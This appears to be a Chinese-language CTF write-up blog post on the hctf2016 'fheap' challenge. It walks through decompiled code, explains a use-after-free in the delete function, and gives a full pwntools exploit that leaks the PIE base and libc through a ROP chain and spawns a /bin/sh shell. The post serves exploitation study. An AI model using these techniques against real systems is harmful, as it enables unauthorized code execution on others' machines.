---
title: 巩固uaf
date: 2022-03-16 15:45:46
tags:
    - uaf
    - 堆
---

<!--more-->

实践是唯一真理，巩固靠做题

# hctf2016_fheap

这一道题是基于UAF情况下比较难的一题（自认为）。

![image-20220316161700332](https://s2.loli.net/2022/03/27/MpwLzbd8O2YXf3S.png)

查看程序可以看到大部分保护都开了，开启PIE二进制程序加载的基址也将被随机化

![image-20220316162012092](https://s2.loli.net/2022/03/27/Sjxa1UQDghCmHb9.png)

随机跑一下程序，可以看到delete两次之后直接有个double free的报错，根据大佬的提示说就是一个UAF，用ida看一下

## 主函数

```
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char buf[1032]; // [rsp+0h] [rbp-410h] BYREF
  unsigned __int64 v5; // [rsp+408h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setbuf(stdout, 0LL);
  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  puts("+++++++++++++++++++++++++++");
  puts("So, let's crash the world");
  puts("+++++++++++++++++++++++++++");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        sub_114B();
        if ( !read(0, buf, 0x400uLL) )
          return 1LL;
        if ( strncmp(buf, "create ", 7uLL) )
          break;
        sub_EC8();
      }
      if ( strncmp(buf, "delete ", 7uLL) )
        break;
      sub_D95();
    }
    if ( !strncmp(buf, "quit ", 5uLL) )
      break;
    puts("Invalid cmd");
  }
  puts("Bye~");
  return 0LL;
}
```

主函数就三个功能，一个create，一个delete，一个quit，写的挺清楚的。

## create函数

```
unsigned __int64 sub_EC8()
{
  int i; // [rsp+4h] [rbp-102Ch]
  char *ptr; // [rsp+8h] [rbp-1028h]
  char *dest; // [rsp+10h] [rbp-1020h]
  size_t nbytes; // [rsp+18h] [rbp-1018h]
  size_t nbytesa; // [rsp+18h] [rbp-1018h]
  char buf[4104]; // [rsp+20h] [rbp-1010h] BYREF
  unsigned __int64 v7; // [rsp+1028h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  ptr = (char *)malloc(0x20uLL);
  printf("Pls give string size:");
  nbytes = (int)sub_B65();
  if ( nbytes <= 0x1000 )
  {
    printf("str:");
    if ( read(0, buf, nbytes) == -1 )
    {
      puts("got elf!!");
      exit(1);
    }
    nbytesa = strlen(buf);
    if ( nbytesa > 0xF )
    {
      dest = (char *)malloc(nbytesa);//先判断是否大于0xF，再申请了一个堆块
      if ( !dest )
      {
        puts("malloc faild!");
        exit(1);
      }
      strncpy(dest, buf, nbytesa);
      *(_QWORD *)ptr = dest;
      *((_QWORD *)ptr + 3) = sub_D6C;//sub_D6C里面有两个free
    }
    else
    {
      strncpy(ptr, buf, nbytesa);
      *((_QWORD *)ptr + 3) = sub_D52;// sub_D5里面有一个free
    }
    *((_DWORD *)ptr + 4) = nbytesa;
    for ( i = 0; i <= 15; ++i )
    {
      if ( !*((_DWORD *)&unk_2020C0 + 4 * i) )
      {
        *((_DWORD *)&unk_2020C0 + 4 * i) = 1;
        *((_QWORD *)&unk_2020C0 + 2 * i + 1) = ptr;
        printf("The string id is %d\n", (unsigned int)i);
        break;
      }
    }
    if ( i == 16 )
    {
      puts("The string list is full");
      (*((void (__fastcall **)(char *))ptr + 3))(ptr);
    }
  }
  else
  {
    puts("Invalid size");
    free(ptr);
  }
  return __readfsqword(0x28u) ^ v7;
}
```

能够得到的信息有存放的指针的地方为基址+2020C0，还看到里面有两个函数都存在free，我们主要运用的是小于等于0xF的堆块的那个free。

## delete函数

```
unsigned __int64 sub_D95()
{
  int v1; // [rsp+Ch] [rbp-114h]
  char buf[264]; // [rsp+10h] [rbp-110h] BYREF
  unsigned __int64 v3; // [rsp+118h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Pls give me the string id you want to delete\nid:");
  v1 = sub_B65();
  if ( v1 < 0 || v1 > 16 )
    puts("Invalid id");
  if ( *((_QWORD *)&unk_2020C0 + 2 * v1 + 1) )//判断偏移8处是否有指针
  {
    printf("Are you sure?:");
    read(0, buf, 0x100uLL);
    if ( !strncmp(buf, "yes", 3uLL) )
    {
      (*(void (__fastcall **)(_QWORD))(*((_QWORD *)&unk_2020C0 + 2 * v1 + 1) + 24LL))(*((_QWORD *)&unk_2020C0
                                                                                      + 2 * v1
                                                                                      + 1));
      *((_DWORD *)&unk_2020C0 + 4 * v1) = 0;//将偏移0处置零
    }
  }
  return __readfsqword(0x28u) ^ v3;
}
```

没有将指针置空，因此导致可以二次释放，多次释放。

## 思路

这一部分参考：https://blog.csdn.net/qq_33528164/article/details/79515831

 假定我们执行一下过程.



    create(4, 'aa')  --> id = 0, 假定堆块地址: 0x5010;
    create(4, 'bb')  --> id = 1, 假定堆块地址: 0x5040
    delete(1)
    delete(0)
    create(0x18, 'a' * 0x18) --> id = 0;

注意: 最后一次create(0x18, 'a' * 0x18 ), malloc两个堆块, 分别为0x5010, 0x5040, 其中0x5040存放的是字符串内容. 0x5010存放着0x5040地址, 如下: .

    0x5000:     0x0000000000000000      0x0000000000000031
    0x5010:     0x0000000000005040      0x0000000000000000
    0x5020:     0x0000000000000018      0x0000000000000d6c(freeShort)
    0x5030:     0x0000000000000000      0x0000000000000031
    0x5040:     0x6161616161616161      0x6161616161616161
    0x5050:     0x6161616161616161      0x0000000000000d52(freeLong)

假如此时, 我们delete(1), 关键代码中的Strings[1].str ==> 0x6161616161616161, 为真. 就会执行0x5058的函数(freeLong).
由此, 我们可以有这样的设想: create(0x20, content), content中的内容可以覆盖1中的freeLong函数. delete(1), 就可以修改程序执行的流程.
**我们还是靠UAF把一些函数（puts）覆盖掉freelong，然后打印出put函数的地址，在计算与puts的libc基址的偏移，再获得system函数后,将free地址覆盖为`system`, 输入`/bin/sh`, 释放.**

## 问题及解决

程序开了pie保护，地址会随即化

![image-20220316165549024](https://s2.loli.net/2022/03/27/i7KgV1c9PL53pMd.png)

像 call free 的地址会在运行中随机化，我们要找的是和它相近的

![image-20220316165644849](https://s2.loli.net/2022/03/27/13Wlw4njzrsS5xH.png)

因为这种函数我们只需覆盖一个字节即可，并且倒数第二个字节的高位地址（这里是0D的0）会随机化

## EXP 

ROPgadget查看可使用的pop

![image-20220317111323474](https://s2.loli.net/2022/03/27/6HZsrSM4eKqLRbP.png)

查找文件plt函数所有地址

![image-20220317111403379](https://s2.loli.net/2022/03/27/C4YTEbO1Z8Qs6tc.png)

```
#coding:utf8
from pwn import *
from ctypes import *
context.log_level='debug'
sh=process('./fheap')
elf=ELF('./fheap')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
def create(size,string):
	sh.sendlineafter('3.quit','create ')
	sh.sendlineafter('size:',str(size))
	sh.sendlineafter('str:',string+'\x00')
def delete(idx):
    sh.recvuntil("quit")
    sh.sendline("delete ")
    sh.recvuntil('id:')
    sh.send(str(idx)+'\n')
    sh.recvuntil('sure?:')
    sh.send('yes '+'\n')

create(15,'aaa')
create(15,'bbb')
create(15,'ccc')
delete(2)
delete(1)
delete(0)
create(0x20,'a'*24+'\x2d')#先将free函数的地址覆盖为puts函数
delete(1)

sh.recvuntil('a'*24)
elf_base=u64(sh.recv(6).ljust(8,'\x00'))-0xd2d#泄露程序的基地址
printf_plt=elf_base+0x9d0
puts_plt=elf_base+0x990
puts_got=elf_base+0x202030
print 'elf_base='+hex(elf_base)
print 'printf_plt='+hex(printf_plt)
print 'puts_plt='+hex(printf_plt)
pop_4=0x11dc+elf_base
pop_rdi=0x11e3+elf_base
print "pop_4="+hex(pop_4)
print "pop_rdi"+hex(pop_rdi)
delete(0)
payload=0x18*'a'
payload+=p64(pop_4)
create(0x20,payload)
delete(1)
sh.sendlineafter('3.quit','delete ')
sh.sendlineafter('id:','1')
sh.recvuntil("sure?:")
payload1='yesaaaaa'+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)
payload1+=p64(0xc71+elf_base)#泄露libc基地址
sh.sendline(payload1)
puts_addr=u64(sh.recv(6).ljust(8,'\x00'))
print 'puts_addr='+hex(puts_addr)
offset=puts_addr-libc.symbols['puts']
system_addr=offset+libc.symbols['system']
binsh_addr=offset+libc.search('/bin/sh').next()
print 'system_addr='+hex(system_addr)
print 'binsh_addr='+hex(binsh_addr)
# pause()
delete(0)
payload=0x18*'a'
payload+=p64(pop_4)
create(0x20,payload)
sh.sendlineafter('3.quit','delete ')
sh.sendlineafter('id:',str(index))
sh.recvuntil("sure?:")
payload1='yesaaaaa'+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)#system函数覆盖
sh.sendline(payload1)
sh.interactive()


```



